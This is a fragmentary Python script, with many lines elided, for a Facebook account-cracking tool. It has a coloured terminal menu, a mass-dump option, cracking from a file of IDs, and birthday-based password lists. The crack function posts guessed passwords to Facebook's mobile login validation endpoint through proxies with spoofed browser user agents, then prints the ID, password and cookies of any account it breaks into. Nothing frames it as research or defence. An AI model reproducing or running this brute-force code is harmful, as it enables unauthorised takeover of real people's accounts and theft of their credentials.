...
def menu():
  ...
  ##  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
   ...
   ## print(f"""\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mCHECK OK IDz   """)
    ...
    #print('------------------------------------------------')
    HAMA = input('\x1b[1;32m HALBZHERA: ')
    if HAMA in ['11']:
        rcrack()
        dump_massal()
    elif HAMA in ['1']:
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    dhy = input('\x1b[1;33m[+] Put file path : ')
...
def setting():
 ...
 ##   print('\033[0;92m=============================')
    ...
    print("\x1b[38;5;5m[ 1 ]ALL PASSWORD BIRTHDAY🖤")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \x1b[1;32m[RAWA🖤]  {a17}{a18}\033[1;37m{loop}|{a11}  [OK:{a20}{a11}\x1b[1;31m{ok}{a15}{P}{M}]\033[1;37m{P}  {'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/15.6.1 Mobile/12B436 Safari/614.3.7'])
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[38;5;5m[RAWA-OK]\x1b[38;5;220m   {idf} | \x1b[38;5;136m{pw} \x1b[38;5;48m{kuki} | \x1b[38;5;208m{ua}')
